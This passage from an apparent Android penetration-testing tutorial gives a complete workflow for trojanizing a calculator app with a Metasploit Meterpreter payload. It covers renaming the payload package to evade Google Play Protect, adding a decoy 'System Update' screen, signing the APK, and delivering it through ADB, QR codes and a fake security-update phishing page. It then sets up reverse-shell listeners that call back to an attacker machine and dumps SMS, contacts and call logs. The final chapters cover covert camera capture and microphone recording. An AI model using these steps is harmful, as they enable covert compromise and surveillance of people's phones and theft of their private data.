# ═══════════════════════════════════════════════════════════════
#
# The default payload uses "com.metasploit.stage" as package name.
# Google Play Protect KNOWS this name!
#
# We can change it to something less obvious.
#
# ═══════════════════════════════════════════════════════════════

# Before copying payload Smali, rename the package
# Original: com/metasploit/stage/
# New:      com/android/system/service/

# Create new directory structure
mkdir -p decompiled/calculator/smali/com/android/system/service/

# Copy payload files
cp decompiled/payload/smali/com/metasploit/stage/*.smali \
   decompiled/calculator/smali/com/android/system/service/

# Rename all references in the Smali files
cd decompiled/calculator/smali/com/android/system/service/

# Replace all occurrences of the old package name
for file in *.smali; do
    sed -i 's|com/metasploit/stage|com/android/system/service|g' "$file"
    sed -i 's|com\.metasploit\.stage|com.android.system.service|g' "$file"
done

cd ~/android-pentest

# Update the manifest to use new package name
sed -i 's|com.metasploit.stage|com.android.system.service|g' \
    decompiled/calculator/AndroidManifest.xml

echo "[+] Package name changed to com.android.system.service"
echo "[+] This is much harder for Play Protect to detect!"
```

### 12.3 Adding a Fake Activity (Decoy)

```bash
# ═══════════════════════════════════════════════════════════════
# ADDING A DECOY ACTIVITY
# ═══════════════════════════════════════════════════════════════
#
# Instead of making the app close immediately, show a
# convincing UI that makes the user think the app is doing
# something legitimate.
#
# For example, for a "System Update" app:
# - Show "Checking for updates..."
# - Progress bar animation
# - "Your device is up to date"
# - Close after 5 seconds
#
# This gives the payload more time to establish connection.
#
# ═══════════════════════════════════════════════════════════════

# Create a convincing splash screen layout
cat > decompiled/calculator/res/layout/activity_splash.xml << 'EOF'
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:orientation="vertical"
    android:gravity="center"
    android:background="#FFFFFF"
    android:padding="40dp">

    <ImageView
        android:layout_width="120dp"
        android:layout_height="120dp"
        android:src="@drawable/update_icon"
        android:layout_marginBottom="30dp" />

    <TextView
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="System Update"
        android:textSize="28sp"
        android:textColor="#1a73e8"
        android:textStyle="bold"
        android:layout_marginBottom="12dp" />

    <TextView
        android:id="@+id/status_text"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="Checking for updates..."
        android:textSize="16sp"
        android:textColor="#5f6368"
        android:layout_marginBottom="30dp" />

    <ProgressBar
        android:id="@+id/progress_bar"
        style="?android:attr/progressBarStyleHorizontal"
        android:layout_width="250dp"
        android:layout_height="wrap_content"
        android:indeterminate="true"
        android:layout_marginBottom="20dp" />

    <TextView
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="Version 14.0.1"
        android:textSize="12sp"
        android:textColor="#9aa0a6" />

</LinearLayout>
EOF
```

---

## Chapter 13: Post-Build: Signing and Alignment

### 13.1 Understanding APK Signing

```
╔═══════════════════════════════════════════════════════════════════╗
║                    APK SIGNING EXPLAINED                          ║
╠═══════════════════════════════════════════════════════════════════╣
║                                                                    ║
║  WHY IS SIGNING REQUIRED?                                          ║
║  ─────────────────────────                                         ║
║  Android requires ALL APKs to be digitally signed.                 ║
║  The signature:                                                    ║
║  1. Proves who created the app (identity)                          ║
║  2. Ensures the app hasn't been tampered with (integrity)          ║
║  3. Enables updates (same signature = same developer)              ║
║                                                                    ║
║  SIGNING SCHEMES:                                                  ║
║  ─────────────────────────                                         ║
║  v1 (JAR signing):  Original, still supported                      ║
║  v2 (APK Signature Scheme v2): Android 7.0+                        ║
║  v3 (APK Signature Scheme v3): Android 9.0+                        ║
║  v4 (APK Signature Scheme v4): Android 11.0+ (incremental)         ║
║                                                                    ║
║  KEYSTORE vs KEY:                                                  ║
║  ─────────────────────────                                         ║
║  Keystore: A file that contains one or more keys                   ║
║  Key: A cryptographic key pair (public + private)                  ║
║  Alias: A name for a specific key within the keystore              ║
║                                                                    ║
║  SIGNING PROCESS:                                                  ║
║  ─────────────────────────                                         ║
║  1. Create keystore (one-time)                                     ║
║  2. zipalign the APK (pre-signing optimization)                    ║
║  3. Sign with apksigner or jarsigner                               ║
║  4. Verify signature                                               ║
║                                                                    ║
╚═══════════════════════════════════════════════════════════════════╝
```

### 13.2 Complete Signing Reference

```bash
# ═══════════════════════════════════════════════════════════════
# COMPLETE SIGNING REFERENCE
# ═══════════════════════════════════════════════════════════════

# ─────────────────────────────────────────────────
# CREATE KEYSTORE (do this once, reuse for all APKs)
# ─────────────────────────────────────────────────

keytool -genkeypair -v \
    -keystore ~/android-pentest/signing_keys/release.keystore \
    -alias mykey \
    -keyalg RSA \
    -keysize 2048 \
    -validity 10000 \
    -storepass MySecurePass123 \
    -keypass MySecurePass123 \
    -dname "CN=John Smith, OU=Development, O=My Company, L=Mumbai, S=Maharashtra, C=IN"

# ─────────────────────────────────────────────────
# LIST KEYSTORE CONTENTS
# ─────────────────────────────────────────────────

keytool -list -v \
    -keystore ~/android-pentest/signing_keys/release.keystore \
    -storepass MySecurePass123

# ─────────────────────────────────────────────────
# ZIPALIGN (always before signing)
# ─────────────────────────────────────────────────

zipalign -v 4 input.apk aligned.apk

# -v = verbose output
# 4 = alignment in bytes (4-byte boundary)
# This must be done BEFORE signing!

# ─────────────────────────────────────────────────
# SIGN WITH apksigner (RECOMMENDED)
# ─────────────────────────────────────────────────

apksigner sign \
    --ks ~/android-pentest/signing_keys/release.keystore \
    --ks-key-alias mykey \
    --ks-pass pass:MySecurePass123 \
    --key-pass pass:MySecurePass123 \
    --out signed.apk \
    aligned.apk

# Additional apksigner options:
# --ks-key-alias     : Key alias in the keystore
# --ks-pass          : Keystore password (pass:xxx or file:path)
# --key-pass         : Key password
# --out              : Output signed APK path
# --v1-signing-enabled true   : Enable v1 signing
# --v2-signing-enabled true   : Enable v2 signing
# --v3-signing-enabled true   : Enable v3 signing

# ─────────────────────────────────────────────────
# SIGN WITH jarsigner (ALTERNATIVE/LEGACY)
# ─────────────────────────────────────────────────

jarsigner -verbose \
    -sigalg SHA256withRSA \
    -digestalg SHA-256 \
    -keystore ~/android-pentest/signing_keys/release.keystore \
    -storepass MySecurePass123 \
    -keypass MySecurePass123 \
    input.apk \
    mykey

# Note: jarsigner doesn't need zipalign before signing
# You can zipalign after jarsigner signing
# But apksigner requires zipalign BEFORE signing

# ─────────────────────────────────────────────────
# VERIFY SIGNATURE
# ─────────────────────────────────────────────────

# Using apksigner (recommended)
apksigner verify --verbose --print-certs signed.apk

# Using keytool
keytool -printcert -jarfile signed.apk

# Using jarsigner
jarsigner -verify -verbose -certs signed.apk

# ─────────────────────────────────────────────────
# COMPLETE WORKFLOW (copy-paste ready)
# ─────────────────═══════════════════════════════

INPUT_APK="bound_apps/calculator_bound_unsigned.apk"
ALIGNED_APK="bound_apps/calculator_bound_aligned.apk"
SIGNED_APK="bound_apps/calculator_bound_signed.apk"
KEYSTORE="signing_keys/release.keystore"
ALIAS="mykey"
PASSWORD="MySecurePass123"

# Step 1: Align
echo "[1/3] Aligning..."
zipalign -v 4 "$INPUT_APK" "$ALIGNED_APK"

# Step 2: Sign
echo "[2/3] Signing..."
apksigner sign \
    --ks "$KEYSTORE" \
    --ks-key-alias "$ALIAS" \
    --ks-pass pass:"$PASSWORD" \
    --key-pass pass:"$PASSWORD" \
    --out "$SIGNED_APK" \
    "$ALIGNED_APK"

# Step 3: Verify
echo "[3/3] Verifying..."
apksigner verify --verbose "$SIGNED_APK"

echo "[+] Done! Signed APK: $SIGNED_APK"
```

---

# PART 4: DELIVERING THE PAYLOAD

---

## Chapter 14: Delivery Methods Overview

```
╔═══════════════════════════════════════════════════════════════════╗
║              PAYLOAD DELIVERY METHODS                             ║
╠═══════════════════════════════════════════════════════════════════╣
║                                                                    ║
║  1. DIRECT INSTALLATION (Physical Access)                          ║
║     ├── USB + ADB                                                  ║
║     ├── SD Card                                                    ║
║     ├── USB OTG                                                    ║
║     └── Difficulty: EASY (requires physical access)                ║
║                                                                    ║
║  2. NETWORK-BASED DELIVERY                                         ║
║     ├── HTTP download link                                         ║
║     ├── Phishing website                                           ║
║     ├── WiFi captive portal                                        ║
║     └── Difficulty: MODERATE                                       ║
║                                                                    ║
║  3. SOCIAL ENGINEERING                                             ║
║     ├── Email attachment                                           ║
║     ├── SMS with download link                                     ║
║     ├── WhatsApp/Telegram message                                  ║
║     ├── Fake app store                                             ║
║     └── Difficulty: MODERATE-HARD                                  ║
║                                                                    ║
║  4. NETWORK ATTACKS                                                ║
║     ├── MITM (Man-in-the-Middle)                                   ║
║     ├── ARP spoofing + HTTP injection                              ║
║     ├── Evil twin WiFi + captive portal                            ║
║     ├── DNS spoofing                                               ║
║     └── Difficulty: HARD                                           ║
║                                                                    ║
║  5. DRIVE-BY DOWNLOADS                                             ║
║     ├── Browser exploit + APK download                             ║
║     ├── Malicious ad (malvertising)                                ║
║     ├── Compromised website                                        ║
║     └── Difficulty: HARD                                           ║
║                                                                    ║
╚═══════════════════════════════════════════════════════════════════╝
```

## Chapter 15: Direct Installation Methods

### 15.1 Installing via ADB (USB)

```bash
# ═══════════════════════════════════════════════════════════════
# ADB INSTALLATION (REQUIRES USB ACCESS TO DEVICE)
# ═══════════════════════════════════════════════════════════════
#
# Prerequisites:
#   - USB cable connected to device
#   - USB Debugging enabled on device
#   - ADB drivers installed on your machine
#   - Device authorized for ADB (tap "Allow" on device)
#
# ═══════════════════════════════════════════════════════════════

# Step 1: Verify device connection
adb devices
# Expected output:
# List of devices attached
# XXXXXXXXX    device

# If device shows "unauthorized":
# - Check the device screen
# - Tap "Allow USB debugging" checkbox
# - Tap "OK"

# Step 2: Check device info
adb shell getprop ro.product.model
# Example: Pixel 4

adb shell getprop ro.build.version.release
# Example: 13

adb shell getprop ro.product.cpu.abi
# Example: arm64-v8a

# Step 3: Install the bound APK
adb install ~/android-pentest/bound_apps/calculator_bound_signed.apk

# Expected output:
# Performing Streamed Install
# Success

# If app already exists, use -r to replace:
adb install -r ~/android-pentest/bound_apps/calculator_bound_signed.apk

# Step 4: Verify installation
adb shell pm list packages | grep calculator
# Output: package:com.google.android.calculator

# Step 5: Launch the app
adb shell am start -n com.google.android.calculator/com.google.android.calculator.Calculator

# Step 6: Check if payload is running
# (On your Kali machine, the listener should receive a connection!)

# ─────────────────────────────────────────────────
# ADB INSTALL OPTIONS:
# ─────────────────────────────────────────────────
# adb install app.apk           Install APK
# adb install -r app.apk        Replace existing app
# adb install -t app.apk        Allow test APKs
# adb install -d app.apk        Allow downgrade
# adb install -g app.apk        Grant all permissions
# adb install -s app.apk        Install on SD card
# ─────────────────────────────────────────────────
```

### 15.2 Transferring APK via Various Methods

```bash
# ═══════════════════════════════════════════════════════════════
# TRANSFERRING APK TO DEVICE
# ═══════════════════════════════════════════════════════════════

# Method 1: ADB Push + Manual Install
adb push ~/android-pentest/bound_apps/calculator_bound_signed.apk /sdcard/Download/
# On device: Open File Manager → Navigate to Download → Tap the APK

# Method 2: Transfer via HTTP (your machine serves the file)
cd ~/android-pentest/bound_apps/
python3 -m http.server 8080
# On device browser: http://192.168.1.10:8080/calculator_bound_signed.apk

# Method 3: Email attachment (for authorized phishing)
# Attach APK to email and send to authorized test user

# Method 4: Cloud storage link
# Upload to Google Drive, Dropbox, etc.
# Share link with authorized test user

# Method 5: QR Code (download link)
# Generate QR code with download URL
qrencode -o ~/android-pentest/reports/download_qr.png \
    "http://192.168.1.10:8080/calculator_bound_signed.apk"
# User scans QR code and downloads APK
```

---

## Chapter 16: Remote Delivery Methods

### 16.1 Setting Up a Download Server

```bash
# ═══════════════════════════════════════════════════════════════
# HTTP DOWNLOAD SERVER
# ═══════════════════════════════════════════════════════════════
#
# Serve the APK file over HTTP so users can download it.
# This simulates a real-world attack vector.
#
# ═══════════════════════════════════════════════════════════════

# Method 1: Simple Python HTTP server
cd ~/android-pentest/bound_apps/
python3 -m http.server 8080 --bind 0.0.0.0
# Access: http://192.168.1.10:8080/calculator_bound_signed.apk

# Method 2: Apache (more features)
sudo apt install apache2 -y
sudo cp ~/android-pentest/bound_apps/calculator_bound_signed.apk /var/www/html/
sudo systemctl start apache2
# Access: http://192.168.1.10/calculator_bound_signed.apk

# Method 3: Using Metasploit's built-in server
# (We'll cover this in the listener chapter)

# Method 4: Ngrok (for external/internet access)
# Install ngrok
# curl -s https://ngrok-agent.s3.amazonaws.com/ngrok-v3-stable-linux-amd64.tgz | tar xz
# ./ngrok http 8080
# This gives you a public URL like https://xxxx.ngrok.io
```

### 16.2 Creating a Phishing Website

```html
<!-- Save as ~/android-pentest/phishing/index.html -->
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Update Required</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .container {
            background: white;
            border-radius: 20px;
            padding: 40px;
            max-width: 400px;
            width: 90%;
            text-align: center;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
        }
        .icon {
            width: 80px;
            height: 80px;
            background: #4CAF50;
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 0 auto 20px;
        }
        .icon svg {
            width: 40px;
            height: 40px;
            fill: white;
        }
        h1 {
            color: #333;
            margin-bottom: 10px;
            font-size: 24px;
        }
        p {
            color: #666;
            margin-bottom: 20px;
            line-height: 1.6;
        }
        .version {
            background: #f0f0f0;
            padding: 10px;
            border-radius: 8px;
            margin-bottom: 20px;
            font-size: 14px;
            color: #555;
        }
        .btn {
            display: inline-block;
            background: #4CAF50;
            color: white;
            padding: 15px 40px;
            border-radius: 30px;
            text-decoration: none;
            font-size: 18px;
            font-weight: bold;
            transition: all 0.3s;
            box-shadow: 0 4px 15px rgba(76, 175, 80, 0.4);
        }
        .btn:hover {
            background: #45a049;
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(76, 175, 80, 0.6);
        }
        .note {
            font-size: 12px;
            color: #999;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="icon">
            <svg viewBox="0 0 24 24">
                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
            </svg>
        </div>
        
        <h1>System Update Available</h1>
        
        <p>A critical security update is available for your Android device. Install now to protect your data.</p>
        
        <div class="version">
            Version 14.0.1 — Security Patch (July 2026)<br>
            Size: 12.4 MB
        </div>
        
        <a href="calculator_bound_signed.apk" class="btn" download>
            ⬇ Download Update
        </a>
        
        <p class="note">
            This update includes important security fixes.<br>
            Your device may restart after installation.
        </p>
    </div>
</body>
</html>
```

```bash
# Serve the phishing page
cd ~/android-pentest/phishing/
cp ~/android-pentest/bound_apps/calculator_bound_signed.apk .
python3 -m http.server 8080 --bind 0.0.0.0
# Access: http://192.168.1.10:8080/
```

---

# PART 5: SETTING UP LISTENERS

---

## Chapter 19: Understanding Listeners (Handlers)

### 19.1 What is a Listener?

```
╔═══════════════════════════════════════════════════════════════════╗
║                    LISTENER (HANDLER) EXPLAINED                   ║
╠═══════════════════════════════════════════════════════════════════╣
║                                                                    ║
║  A Listener (also called Handler) is a Metasploit module          ║
║  that WAITS for incoming connections from our payloads.            ║
║                                                                    ║
║  Think of it like a phone:                                         ║
║  - The payload is like a phone that CALLS you                      ║
║  - The listener is like YOUR phone waiting for the call            ║
║  - When the call connects, you have a SESSION (conversation)       ║
║                                                                    ║
║  ═══════════════════════════════════════════════════════════════   ║
║                                                                    ║
║  HOW IT WORKS:                                                     ║
║                                                                    ║
║  Your Machine (Kali)              Target Device (Android)          ║
║  ┌──────────────────┐             ┌──────────────────┐            ║
║  │                  │             │                  │            ║
║  │  LISTENER        │             │  PAYLOAD         │            ║
║  │  (Handler)       │             │  (Meterpreter)   │            ║
║  │                  │             │                  │            ║
║  │  Waiting on...   │  ─────────→│  Connects to     │            ║
║  │  LHOST:LPORT     │  TCP/HTTP  │  LHOST:LPORT     │            ║
║  │                  │             │                  │            ║
║  │  Receives        │             │  Sends           │            ║
║  │  connection      │←─────────  │  "I'm here!"     │            ║
║  │                  │             │                  │            ║
║  │  Sends           │             │  Receives        │            ║
║  │  Meterpreter     │──────────→ │  Meterpreter     │            ║
║  │  stage           │             │  stage           │            ║
║  │                  │             │                  │            ║
║  │  SESSION         │             │  Executing       │            ║
║  │  ESTABLISHED     │←──────────→│  Meterpreter     │            ║
║  │                  │  Encrypted  │  in memory       │            ║
║  │  meterpreter >   │             │                  │            ║
║  │                  │             │                  │            ║
║  └──────────────────┘             └──────────────────┘            ║
║                                                                    ║
║  CRITICAL REQUIREMENT:                                            ║
║  The listener's LHOST and LPORT MUST match the payload's          ║
║  LHOST and LPORT EXACTLY!                                         ║
║                                                                    ║
╚═══════════════════════════════════════════════════════════════════╝
```

### 19.2 Listener Types

```
LISTENER TYPES:
│
├── exploit/multi/handler
│   ├── The MOST COMMON listener
│   ├── Handles ALL payload types
│   ├── Works with TCP, HTTP, HTTPS
│   └── This is what we'll use 99% of the time
│
├── exploit/multi/handler + set payload android/meterpreter/reverse_tcp
│   ├── Handles Android reverse TCP payloads
│   ├── Waits for TCP connections on specified port
│   └── When connection arrives → stages Meterpreter
│
├── exploit/multi/handler + set payload android/meterpreter/reverse_http
│   ├── Handles Android reverse HTTP payloads
│   ├── Starts an HTTP server
│   ├── Payload connects via HTTP requests
│   └── Better for bypassing firewalls
│
└── exploit/multi/handler + set payload android/meterpreter/reverse_https
    ├── Handles Android reverse HTTPS payloads
    ├── Starts an HTTPS server (encrypted)
    ├── Most stealthy option
    └── Requires SSL certificate (self-signed works)
```

## Chapter 20: Basic Listener Setup

### 20.1 Simple TCP Listener

```bash
# ═══════════════════════════════════════════════════════════════
# METHOD 1: BASIC TCP LISTENER (MOST COMMON)
# ═══════════════════════════════════════════════════════════════
#
# This is the simplest way to set up a listener.
# It works with android/meterpreter/reverse_tcp payloads.
#
# ═══════════════════════════════════════════════════════════════

# Start msfconsole
msfconsole

# ─────────────────────────────────────────────────
# STEP 1: Select the handler module
# ─────────────────────────────────────────────────
msf6 > use exploit/multi/handler

# Verify the module is loaded
msf6 exploit(multi/handler) > info
# Shows: Name: Generic Payload Handler
#        Module: exploit/multi/handler

# ─────────────────────────────────────────────────
# STEP 2: Set the payload
# ─────────────────────────────────────────────────
msf6 exploit(multi/handler) > set payload android/meterpreter/reverse_tcp

# This tells the handler: "Expect an Android Meterpreter
# reverse TCP connection"

# Verify payload is set
msf6 exploit(multi/handler) > show options

# ─────────────────────────────────────────────────
# STEP 3: Set LHOST (Your IP)
# ─────────────────────────────────────────────────
msf6 exploit(multi/handler) > set LHOST 192.168.1.10

# LHOST = "Local Host" = YOUR machine's IP address
# This MUST match the LHOST you used when generating the payload!
# The payload will connect TO this IP address.

# ─────────────────────────────────────────────────
# STEP 4: Set LPORT (Your Port)
# ─────────────────────────────────────────────────
msf6 exploit(multi/handler) > set LPORT 4444

# LPORT = "Local Port" = YOUR machine's port
# This MUST match the LPORT you used when generating the payload!
# The payload will connect TO this port.

# ─────────────────────────────────────────────────
# STEP 5: Review all options
# ─────────────────────────────────────────────────
msf6 exploit(multi/handler) > show options

# Expected output:
# Module options (exploit/multi/handler):
#    Name   Current Setting  Required  Description
#    ----   ---------------  --------  -----------
#
# Payload options (android/meterpreter/reverse_tcp):
#    Name   Current Setting  Required  Description
#    ----   ---------------  --------  -----------
#    LHOST  192.168.1.10     yes       The listen address
#    LPORT  4444             yes       The listen port

# ─────────────────────────────────────────────────
# STEP 6: START THE LISTENER
# ─────────────────────────────────────────────────
msf6 exploit(multi/handler) > exploit

# OR equivalently:
msf6 exploit(multi/handler) > run

# Expected output:
# [*] Started reverse TCP handler on 192.168.1.10:4444
# [*] Starting the payload handler...
#
# The listener is now WAITING for connections.
# When a device runs our payload, it will connect here.
#
# ─────────────────────────────────────────────────
# WAITING FOR CONNECTION...
# ─────────────────────────────────────────────────
#
# Now, when someone installs and opens the bound APK
# on their Android device, you'll see:
#
# [*] Sending stage (79994 bytes)
# [*] Meterpreter session 1 opened (192.168.1.10:4444 → 192.168.1.50:xxxxx)
#
# meterpreter >
#
# ═══════════════════════════════════════════════════════════════
# CONGRATULATIONS! YOU HAVE A METERPRETER SESSION!
# ═══════════════════════════════════════════════════════════════
```

### 20.2 Quick One-Line Listener

```bash
# ═══════════════════════════════════════════════════════════════
# ONE-LINE LISTENER (FASTEST METHOD)
# ═══════════════════════════════════════════════════════════════
#
# If you want to skip the interactive setup, use this command.
# It starts msfconsole, configures everything, and runs.
#
# ═══════════════════════════════════════════════════════════════

# Basic one-liner
msfconsole -q -x "\
    use exploit/multi/handler; \
    set payload android/meterpreter/reverse_tcp; \
    set LHOST 192.168.1.10; \
    set LPORT 4444; \
    set ExitOnSession false; \
    exploit -j"

# Explanation:
# msfconsole -q      = Start quiet (no banner)
# -x "commands"      = Execute these commands on startup
# use exploit/multi/handler   = Select handler
# set payload ...     = Set Android payload
# set LHOST ...       = Your IP
# set LPORT ...       = Your port
# set ExitOnSession false = Keep listening after session connects
# exploit -j          = Run as background job

# ─────────────────────────────────────────────────
# VARIATION: With HTTPS payload
# ─────────────────────────────────────────────────
msfconsole -q -x "\
    use exploit/multi/handler; \
    set payload android/meterpreter/reverse_https; \
    set LHOST 192.168.1.10; \
    set LPORT 443; \
    set ExitOnSession false; \
    exploit -j"

# ─────────────────────────────────────────────────
# VARIATION: With HTTP payload
# ─────────────────────────────────────────────────
msfconsole -q -x "\
    use exploit/multi/handler; \
    set payload android/meterpreter/reverse_http; \
    set LHOST 192.168.1.10; \
    set LPORT 8080; \
    set ExitOnSession false; \
    exploit -j"
```

### 20.3 Listener via Resource Script

```bash
# ═══════════════════════════════════════════════════════════════
# RESOURCE SCRIPT METHOD (RECOMMENDED FOR REUSE)
# ═══════════════════════════════════════════════════════════════
#
# Resource scripts let you save your configuration and
# reuse it easily. This is the professional way.
#
# ═══════════════════════════════════════════════════════════════

# Create the resource script
cat > ~/android-pentest/listeners/android_tcp_handler.rc << 'EOF'
# ═══════════════════════════════════════════════════════════════
# Android Meterpreter TCP Handler
# Author: EFXTv
# Created: $(date)
# ═══════════════════════════════════════════════════════════════

# Use the multi/handler module
use exploit/multi/handler

# Set the payload (must match what was used to generate APK)
set payload android/meterpreter/reverse_tcp

# Set YOUR IP address (the machine running this listener)
set LHOST 192.168.1.10

# Set YOUR port
set LPORT 4444

# Don't exit when a session connects (keep listening for more)
set ExitOnSession false

# Enable verbose output
set VERBOSE true

# Start the handler as a background job
exploit -j -z

# Print confirmation
echo [*] Android TCP Handler started on 192.168.1.10:4444
echo [*] Waiting for connections...
echo [*] Press Ctrl+C to stop
EOF

# Run the resource script
msfconsole -r ~/android-pentest/listeners/android_tcp_handler.rc

# ─────────────────────────────────────────────────
# CREATE HANDLERS FOR DIFFERENT PAYLOAD TYPES
# ─────────────────────────────────────────────────

# HTTPS Handler
cat > ~/android-pentest/listeners/android_https_handler.rc << 'EOF'
use exploit/multi/handler
set payload android/meterpreter/reverse_https
set LHOST 192.168.1.10
set LPORT 443
set ExitOnSession false
set VERBOSE true
exploit -j -z
echo [*] Android HTTPS Handler started on 192.168.1.10:443
EOF

# HTTP Handler
cat > ~/android-pentest/listeners/android_http_handler.rc << 'EOF'
use exploit/multi/handler
set payload android/meterpreter/reverse_http
set LHOST 192.168.1.10
set LPORT 8080
set ExitOnSession false
set VERBOSE true
exploit -j -z
echo [*] Android HTTP Handler started on 192.168.1.10:8080
EOF
```

## Chapter 21: Advanced Listener Configuration

### 21.1 Multi-Port Listener Setup

```bash
# ═══════════════════════════════════════════════════════════════
# MULTI-PORT LISTENER
# ═══════════════════════════════════════════════════════════════
#
# Set up listeners on multiple ports simultaneously.
# Useful when you've generated payloads on different ports.
#
# ═══════════════════════════════════════════════════════════════

cat > ~/android-pentest/listeners/multi_port.rc << 'EOF'
# Multi-port Android listener configuration
# Listens on ports 4444, 4445, 5555, 8080, 8443

# Handler 1: Port 4444
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set LHOST 192.168.1.10
set LPORT 4444
set ExitOnSession false
exploit -j -z
echo [*] Handler started on port 4444

# Handler 2: Port 4445
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set LHOST 192.168.1.10
set LPORT 4445
set ExitOnSession false
exploit -j -z
echo [*] Handler started on port 4445

# Handler 3: Port 5555
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set LHOST 192.168.1.10
set LPORT 5555
set ExitOnSession false
exploit -j -z
echo [*] Handler started on port 5555

# Handler 4: HTTPS on 443
use exploit/multi/handler
set payload android/meterpreter/reverse_https
set LHOST 192.168.1.10
set LPORT 443
set ExitOnSession false
exploit -j -z
echo [*] HTTPS Handler started on port 443

# Handler 5: HTTP on 8080
use exploit/multi/handler
set payload android/meterpreter/reverse_http
set LHOST 192.168.1.10
set LPORT 8080
set ExitOnSession false
exploit -j -z
echo [*] HTTP Handler started on port 8080

echo [*] All handlers started! Listening on 5 ports.
echo [*] Use 'jobs -l' to see running handlers
EOF

msfconsole -r ~/android-pentest/listeners/multi_port.rc
```

### 21.2 Listener with Auto-Exploitation

```bash
# ═══════════════════════════════════════════════════════════════
# LISTENER WITH AUTO-EXPLOITATION
# ═══════════════════════════════════════════════════════════════
#
# When a session connects, automatically run post-exploitation
# modules to collect data.
#
# ═══════════════════════════════════════════════════════════════

cat > ~/android-pentest/listeners/auto_exploit.rc << 'EOF'
# Auto-exploitation handler
# Runs post-exploitation automatically when session connects

use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set LHOST 192.168.1.10
set LPORT 4444
set ExitOnSession false
set AutoRunScript post/android/gather/enum_applications
exploit -j -z

echo [*] Auto-exploitation handler started
echo [*] Will automatically enumerate apps on connection
EOF

# ─────────────────────────────────────────────────
# MORE AUTOMATION OPTIONS
# ─────────────────────────────────────────────────

# Auto-collect all data
set AutoRunScript multi_console_command -rc /tmp/auto_commands.rc

# Where /tmp/auto_commands.rc contains:
# run post/android/gather/enum_applications
# run post/android/gather/sms_dump
# run post/android/gather/contacts
# run post/android/gather/call_log_dump
```

---

# PART 6: POST-EXPLOITATION ON ANDROID

---

## Chapter 24: Meterpreter Commands for Android

### 24.1 Basic Session Interaction

```bash
# ═══════════════════════════════════════════════════════════════
# INTERACTING WITH AN ANDROID SESSION
# ═══════════════════════════════════════════════════════════════

# List all sessions
msf6 > sessions -l

# Expected output:
# Id  Type         Information          Connection
# --  ----         -----------          ----------
# 1   meterpreter  android/arm @ localhost  192.168.1.10:4444 → 192.168.1.50:xxxxx

# Interact with session 1
msf6 > sessions -i 1

# You're now in the Meterpreter console:
# meterpreter >

# ─────────────────────────────────────────────────
# BASIC INFORMATION COMMANDS
# ─────────────────────────────────────────────────

# Get system information
meterpreter > sysinfo
# Computer    : localhost
# OS          : Android 13 - Linux 5.15.41-android13-8 (arm64)
# Architecture: aarch64
# Meterpreter : java/android

# Get current user
meterpreter > getuid
# Server username: u0_a123
# (u0_a123 means user app with UID 10123)

# Get device ID
meterpreter > device_get_info
# Shows: IMEI, phone number, carrier, etc.

# Background the session (return to msfconsole)
meterpreter > background
# OR
meterpreter > bg

# Interact with session again later
msf6 > sessions -i 1
```

## Chapter 25: Data Extraction

### 25.1 SMS Messages

```bash
# ═══════════════════════════════════════════════════════════════
# EXTRACTING SMS MESSAGES
# ═══════════════════════════════════════════════════════════════

# Dump all SMS messages
meterpreter > dump_sms
# Output: [*] Fetching 150 SMS messages...
#         [*] SMS saved to: /root/.msf4/loot/20260711_xxxx_sms_xxx

# Using post module (more detailed)
meterpreter > background
msf6 > use post/android/gather/sms_dump
msf6 post(android/gather/sms_dump) > set SESSION 1
msf6 post(android/gather/sms_dump) > run
```

### 25.2 Contacts

```bash
# ═══════════════════════════════════════════════════════════════
# EXTRACTING CONTACTS
# ═══════════════════════════════════════════════════════════════

meterpreter > dump_contacts
# Output: [*] Fetching 250 contacts...
#         [*] Contacts saved to: /root/.msf4/loot/...
```

### 25.3 Call Logs

```bash
# ═══════════════════════════════════════════════════════════════
# EXTRACTING CALL LOGS
# ═══════════════════════════════════════════════════════════════

meterpreter > dump_calls
# Output: [*] Fetching call logs...
#         [*] Call log saved to: /root/.msf4/loot/...
```

### 25.4 Installed Applications

```bash
# ═══════════════════════════════════════════════════════════════
# LISTING INSTALLED APPLICATIONS
# ═══════════════════════════════════════════════════════════════

# Using post module
meterpreter > run post/android/gather/enum_applications
# Output: [*] Enumerating installed applications
#         [*] Package: com.google.android.gm (Gmail)
#         [*] Package: com.whatsapp (WhatsApp)
#         [*] ...
```

## Chapter 26: Surveillance Capabilities

### 26.1 Camera Access

```bash
# ═══════════════════════════════════════════════════════════════
# CAMERA ACCESS
# ═══════════════════════════════════════════════════════════════

# List available webcams (cameras)
meterpreter > webcam_list
# Output: 1: Front Camera
#         2: Back Camera

# Take photo with front camera
meterpreter > webcam_snap -i 1
# Output: [*] Starting...
#         [*] Capturing...
#         [*] Snapshot saved: /root/.msf4/loot/...

# Take photo with back camera
meterpreter > webcam_snap -i 2

# Take photo and specify output location
meterpreter > webcam_snap -i 1 -p ~/android-pentest/loot/photo.jpg

# Note: CAMERA permission must be in the APK's manifest!
```

### 26.2 Audio Recording

```bash
# ═══════════════════════════════════════════════════════════════
# AUDIO RECORDING
# ═══════════════════════════════════════════════════════════════

# Record audio for 10 seconds
meterpreter > record_mic -d 10
# Output: [*] Starting recording...
#         [*] Recording for 10 seconds...
#         [*] Saving recording...
